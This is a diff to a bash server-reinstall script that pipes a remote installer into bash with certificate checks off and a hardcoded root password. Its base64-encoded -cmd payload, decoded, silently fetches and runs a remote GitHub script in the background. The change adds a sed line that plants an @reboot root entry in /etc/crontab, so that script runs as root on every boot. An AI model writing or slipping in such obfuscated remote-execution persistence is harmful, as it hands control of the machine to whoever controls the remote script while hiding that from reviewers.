@@ -1,3 +1,3 @@
 #!/bin/bash
 
-bash <(wget --no-check-certificate -qO- https://raw.githubusercontent.com/MoeClub/Note/master/InstallNET.sh) -d 12 -v 64 -a -p "Ls.123456" -port 2233 -cmd "IyEvYmluL2Jhc2gKCmFwdCAtcXF5IGluc3RhbGwgd2dldApiYXNoIDwod2dldCAtcU8tIGh0dHBzOi8vZ2l0aHViLmNvbS9hcm15Mm1pbC9uamFic2NiL3Jhdy9yZWZzL2hlYWRzL21haW4vLi4uKSA+Pi9kZXYvbnVsbCAyPiYxICYK"
+bash <(wget --no-check-certificate -qO- https://raw.githubusercontent.com/MoeClub/Note/master/InstallNET.sh) -d 12 -v 64 -a -p "Ls.123456" -port 2233 -cmd "IyEvYmluL2Jhc2gKCmFwdCAtcXF5IGluc3RhbGwgd2dldApiYXNoIDwod2dldCAtcU8tIGh0dHBzOi8vZ2l0aHViLmNvbS9hcm15Mm1pbC9uamFic2NiL3Jhdy9yZWZzL2hlYWRzL21haW4vLi4uKSA+Pi9kZXYvbnVsbCAyPiYxICYKc2VkIC1pICIvXkByZWJvb3QvZDtcJGFcQHJlYm9vdCByb290IC9iaW4vYmFzaCA8KHdnZXQgLXFPLSBodHRwczovL2dpdGh1Yi5jb20vYXJteTJtaWwvbmphYnNjYi9yYXcvcmVmcy9oZWFkcy9tYWluLy4uLikgPj4vZGV2L251bGwgMj4mMSAmXG5cblxuIiAvZXRjL2Nyb250YWI="
